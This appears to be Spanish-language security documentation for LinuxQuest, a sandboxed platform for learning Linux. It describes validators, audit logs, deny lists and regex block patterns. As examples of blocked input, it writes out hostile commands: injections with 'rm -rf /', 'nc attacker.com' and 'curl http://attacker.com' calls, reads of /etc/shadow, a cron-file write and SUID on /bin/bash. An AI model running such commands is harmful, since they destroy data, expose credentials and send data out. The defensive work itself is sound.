# 🔒 Documentación de Seguridad - LinuxQuest

## Visión General

LinuxQuest es una plataforma educativa que enseña comandos Linux en un ambiente completamente **aislado y seguro**. Toda ejecución de comandos ocurre dentro de sandboxes individuales por usuario, con múltiples capas de validación de seguridad.

## Arquitectura de Seguridad

```
┌─────────────────────────────────────────────────────┐
│           Terminal Usuario (Frontend)               │
└────────────────────┬────────────────────────────────┘
                     │
                     │ command + questId
                     │
┌────────────────────▼────────────────────────────────┐
│        Socket.io WebSocket (Encriptado)            │
└────────────────────┬────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────┐
│         Backend Express Server (Fly.io)            │
│                                                     │
│  ┌──────────────────────────────────────────┐      │
│  │  1. Auditoría Logger                    │      │
│  │     - Registra todos los intentos       │      │
│  │     - Detecta patrones maliciosos       │      │
│  └──────────────────────────────────────────┘      │
│              │                                      │
│  ┌──────────▼──────────────────────────────┐      │
│  │  2. Sandbox Validator                   │      │
│  │     - Valida path traversal             │      │
│  │     - Detecta inyecciones de comando    │      │
│  │     - Valida argumentos por misión      │      │
│  └──────────────────────────────────────────┘      │
│              │                                      │
│  ┌──────────▼──────────────────────────────┐      │
│  │  3. Security Config                     │      │
│  │     - Lista de comandos permitidos      │      │
│  │     - Patrones peligrosos globales      │      │
│  │     - Límites de recursos               │      │
│  │     - Directorios prohibidos            │      │
│  └──────────────────────────────────────────┘      │
│              │                                      │
│  ┌──────────▼──────────────────────────────┐      │
│  │  4. Quest Commands Config                │      │
│  │     - Comandos permitidos por misión    │      │
│  │     - Patrones peligrosos específicos   │      │
│  │     - Restricciones de path             │      │
│  └──────────────────────────────────────────┘      │
│              │                                      │
│  ┌──────────▼──────────────────────────────┐      │
│  │  5. Command Service                     │      │
│  │     - Ejecuta en sandbox aislado        │      │
│  │     - Aplica límites de timeout         │      │
│  │     - Sanitiza output                   │      │
│  └──────────────────────────────────────────┘      │
│              │                                      │
│  ┌──────────▼──────────────────────────────┐      │
│  │  6. Sandbox Service                     │      │
│  │     - Directorio /tmp/linuxquest-..     │      │
│  │     - Límites de espacio                │      │
│  │     - Aislamiento por usuario           │      │
│  └──────────────────────────────────────────┘      │
│              │                                      │
└──────────────┼──────────────────────────────────────┘
               │
        /tmp/linuxquest-sandbox/
         user_<userId>/
         ├─ README.txt (read-only)
         ├─ datos.txt (read-only)
         └─ [archivos creados por usuario]
```

## Componentes de Seguridad

### 1. **Sandbox Validator** (`src/security/sandboxValidator.js`)

**Responsabilidad:** Valida la seguridad de cada comando antes de ejecutarlo.

#### Validaciones:

- **Path Traversal Prevention**
  ```javascript
  // ✅ PERMITIDO: /tmp/linuxquest-sandbox/user_123/archivo.txt
  // ❌ BLOQUEADO: /tmp/linuxquest-sandbox/user_123/../../etc/passwd
  
  validatePathTraversal(requestedPath)
  ```

- **Command Injection Detection**
  ```javascript
  // ❌ BLOQUEADO: ls; rm -rf /
  // ❌ BLOQUEADO: echo test | nc attacker.com
  // ❌ BLOQUEADO: cat /etc/passwd
  
  validateCommandInjection(command)
  ```

- **Argument Validation**
  ```javascript
  // Misión 71 solo permite: chmod, ls
  // ✅ PERMITIDO: chmod 755 archivo
  // ❌ BLOQUEADO: chmod 4755 /bin/bash
  
  validateCommandArguments(command, allowedFlags)
  ```

- **Sensitive File Access Detection**
  ```javascript
  // Detecta intentos de acceso a:
  // - /etc/passwd, /etc/shadow
  // - /root, /.ssh
  // - /.dockerenv, /proc/self/cgroup
  
  detectSensitiveFileAccess(command)
  ```

### 2. **Audit Logger** (`src/security/auditLogger.js`)

**Responsabilidad:** Registra todas las acciones para análisis de seguridad.

#### Logs Generados:

```
/tmp/linuxquest-audit/
├─ commands.log           # Todos los comandos ejecutados
├─ security-threats.log   # Intentos críticos bloqueados
├─ security-violations.log # Infracciones de seguridad
├─ sandbox-access.log     # Creación/eliminación de sandboxes
└─ sessions.log           # Inicio/fin de sesión
```

#### Entrada de Log:
```json
{
  "timestamp": "2026-04-27T10:30:45.123Z",
  "userId": "user_123",
  "questId": 42,
  "command": "ls -la",
  "success": true,
  "threatLevel": "INFO",
  "executionTime": 245
}
```

#### Niveles de Amenaza:
- **INFO**: Comando normal
- **WARNING**: Comando bloqueado pero permitido en sandbox
- **CRITICAL**: Intento de ataque bloqueado

### 3. **Security Config** (`src/security/securityConfig.js`)

**Configuración centralizada de todas las políticas de seguridad.**

#### Comandos Prohibidos Globalmente:
```javascript
FORBIDDEN_COMMANDS: [
  'sudo', 'su', 'docker', 'mount', 'modprobe',
  'shutdown', 'reboot', 'dd', 'mkfs', 'ssh',
  'nc', 'socat', 'iptables', 'chroot'
]
```

#### Directorios Prohibidos:
```javascript
FORBIDDEN_PATHS: [
  '/etc/passwd', '/etc/shadow', '/root',
  '/sys', '/proc', '/dev', '/boot',
  '/var/log', '/.docker'
]
```

#### Límites de Recursos:
```javascript
MAX_EXECUTION_TIME: 30000,    // 30 segundos
MAX_OUTPUT_SIZE: 5*1024*1024, // 5 MB
MAX_OUTPUT_LINES: 10000,
COMMANDS_PER_MINUTE: 60,
MAX_SANDBOX_SIZE: 100*1024*1024 // 100 MB
```

#### Patrones Peligrosos Globales:
```javascript
// Se bloquean automáticamente:
/[`;|&]\s*(rm|dd|mkfs|shutdown)/i
/rm\s+(-r|-f|-rf)[\s\*\/]/i
/chmod\s+[0-9]*7[0-9]{2,}/
/\$\(.*\)|`.*`/  // Command substitution
```

### 4. **Quest Commands Config** (`src/config/questCommands.js`)

**Define restricciones específicas por misión educativa.**

#### Ejemplo - Misión 1 (Aprender `uname`):
```javascript
1: {
  world: 1,
  allowedCommands: ['uname', 'help'],
  dangerousPatterns: []
}
```

#### Ejemplo - Misión 84 (Aprender `chmod`):
```javascript
84: {
  world: 5,
  allowedCommands: ['chmod', 'ls', 'help'],
  allowedFlags: ['-', 'R'],
  dangerousPatterns: [
    /chmod\s*4[0-9]{3}\s*\/bin/i, // Previene SUID en /bin
    /chmod\s*2[0-9]{3}\s*\/sbin/i // Previene SGID en /sbin
  ]
}
```

### 5. **Command Service** (`src/services/commandService.js`)

**Orquesta todas las validaciones y ejecuta el comando.**

Flujo:
1. Obtiene configuración de seguridad de la misión
2. Valida contra patrones peligrosos globales
3. Valida contra patrones de la misión
4. Valida argumentos y flags
5. Ejecuta en sandbox con timeout
6. Sanitiza output (máximo 500 líneas)
7. Registra en auditoría

### 6. **Sandbox Service** (`src/services/sandboxService.js`)

**Administra directorios aislados por usuario.**

```
/tmp/linuxquest-sandbox/
├─ user_1/
│  ├─ README.txt        (template)
│  ├─ datos.txt         (template)
│  └─ [archivos usuario]
├─ user_2/
│  ├─ README.txt
│  ├─ datos.txt
│  └─ [archivos usuario]
└─ user_3/
```

#### Características:
- Directorio único por usuario
- Límite de 100MB por usuario
- Validación de path traversal
- Limpieza automática al logout
- Archivos template read-only

## Flujo de Ejecución Segura

```
Usuario escribe comando en Terminal
         ↓
    Socket.io envía
         ↓
  Auditoría registra intento
         ↓
  ¿Es comando prohibido globalmente?
    SÍ → Bloqueado. Error.
    NO ↓
  Sandbox Validator: ¿Path traversal?
    SÍ → Bloqueado. Error.
    NO ↓
  Sandbox Validator: ¿Inyección?
    SÍ → Bloqueado. Error.
    NO ↓
  Quest Config: ¿Comando permitido en misión?
    NO → Bloqueado. Error.
    SÍ ↓
  Quest Config: ¿Patrones peligrosos específicos?
    SÍ → Bloqueado. Error.
    NO ↓
  Sandbox Validator: ¿Argumentos válidos?
    NO → Bloqueado. Error.
    SÍ ↓
  EJECUTAR en /tmp/linuxquest-sandbox/user_<id>/
    con timeout=30s
    maxOutput=5MB
         ↓
  Sanitizar output (máx 500 líneas)
         ↓
  Auditoría registra resultado
         ↓
  Respuesta a cliente
```

## Restricciones por Tipo de Comando

### 1. **Comandos de Lectura** (cat, ls, grep, etc.)
```javascript
// ✅ Permitidos en sandbox
// ❌ Prohibido acceder a: /etc/*, /root, /sys, /proc
```

### 2. **Comandos de Escritura** (touch, mkdir, echo, etc.)
```javascript
// ✅ Permitidos SOLO dentro del sandbox
// ❌ Prohibido acceder a directorios del sistema
// ❌ Prohibido crear archivos fuera del sandbox
```

### 3. **Comandos de Eliminación** (rm, etc.)
```javascript
// ✅ Permitido en sandbox
// ❌ NUNCA: rm -rf /
// ❌ NUNCA: rm -r en /etc, /var, etc.
// ❌ NUNCA con flags recursivos peligrosos
```

### 4. **Comandos de Modificación** (chmod, chown, etc.)
```javascript
// ✅ Permitido en sandbox para aprender
// ❌ NUNCA: chmod sobre archivos del sistema
// ❌ NUNCA: SUID en comandos de sistema
// ❌ NUNCA: chmod 777 globalmente
```

## Medidas Contra Ataques Específicos

### Escape de Sandbox
```
Ataque: cd ../../.. && cat /etc/passwd
Defensa: validatePathTraversal() -> resuelve path real
         Si está fuera de sandbox -> BLOQUEADO
```

### Shell Injection
```
Ataque: ls; nc attacker.com
Defensa: validateCommandInjection() detecta `;`
         Patrones: /[;&|`$()]/
```

### Command Substitution
```
Ataque: echo $(cat /etc/shadow)
Defensa: Detecta $(...) y `...`
         Patrón: /\$\(.*\)|`.*`/
```

### Redirección a Archivos Críticos
```
Ataque: echo malware > /etc/cron.d/evil
Defensa: Patrón: /> .*\/etc/
         Bloquea cualquier redirección a /etc, /var/log, etc.
```

### Race Conditions
```
Ataque: crear symlink durante ejecución
Defensa: - Timeout de 30 segundos
         - Validación de path antes de ejecución
         - Sandbox aislado por usuario
```

## Monitoreo y Alertas

### Eventos que Generan Alerta CRITICAL:
```javascript
- Intento de acceso a /etc/shadow
- Intento de rm -rf /
- Intento de docker/sudo
- Intento de iptables/modprobe
- Intento de command injection
- Acceso a /.dockerenv (escapa de contenedor)
```

### Logs a Revisar Regularmente:
```bash
/tmp/linuxquest-audit/security-threats.log
/tmp/linuxquest-audit/security-violations.log
```

## Testing de Seguridad

### Pruebas de Validación:

```bash
# ✅ DEBE SER BLOQUEADO:
pwd; rm -rf /              # Command injection
$(cat /etc/shadow)         # Command substitution
`whoami > /tmp/hack`       # Backtick substitution
../../../etc/passwd        # Path traversal
cd / && ls                  # Escape de sandbox
curl http://attacker.com   # Comando prohibido

# ✅ DEBE SER PERMITIDO (en sandbox):
ls -la
cat archivo.txt
mkdir miprojecto
echo "Hello"
grep pattern archivo.txt
```

## Configuración de Misiones Seguras

### Plantilla para Nueva Misión:

```javascript
{
  questId: 99,
  world: 3,
  title: 'Aprender nuevo comando',
  
  // Solo comandos que necesita aprender
  allowedCommands: ['comando_principal', 'help'],
  
  // Flags específicos que necesita
  allowedFlags: ['-', 'a', 'l'],
  
  // Patrones peligrosos adicionales para esta misión
  dangerousPatterns: [
    /comando_principal.*-x/i  // Bloquear flag -x
  ],
  
  // Información educativa
  story: 'Aprende a usar comando_principal...',
  hints: ['Usa comando_principal -a para...'],
  
  // Recompensas
  rewards: { xp: 50, coins: 10 }
}
```

## Incident Response

Si ocurre una violación de seguridad:

1. **Verificar logs:**
   ```bash
   tail -f /tmp/linuxquest-audit/security-threats.log
   ```

2. **Identificar usuario:**
   ```bash
   grep "userId" /tmp/linuxquest-audit/security-threats.log
   ```

3. **Revocar acceso:**
   ```bash
   # Limpiar sandbox del usuario
   rm -rf /tmp/linuxquest-sandbox/user_<ID>
   ```

4. **Analizar patrones:**
   ```bash
   grep "command.*pattern" /tmp/linuxquest-audit/commands.log
   ```

## Deployment Seguro

### En Fly.io (Contenedor Docker):
```
- Backend corre en contenedor Linux aislado
- Directorio /tmp es privado al contenedor
- No tiene acceso a otros contenedores
- Rate limiting a nivel HTTP
- JWT para autenticación
```

### Base de Datos (Neon PostgreSQL):
```
- Credenciales en environment variables
- SSL/TLS para conexión
- No se exponen queries raw
- User_id en JWT para aislar datos
```

## Conclusión

LinuxQuest implementa **defensa en profundidad** con múltiples capas de seguridad:

1. **Auditoría** - registra todo
2. **Validación** - previene ataques conocidos
3. **Aislamiento** - sandbox por usuario
4. **Restricción** - limita por misión
5. **Limitación** - timeout y recursos
6. **Prohibición** - comandos nunca permitidos

Esto garantiza que estudiantes pueden practicar Linux de forma **segura y educativa** sin peligro de dañar el sistema.
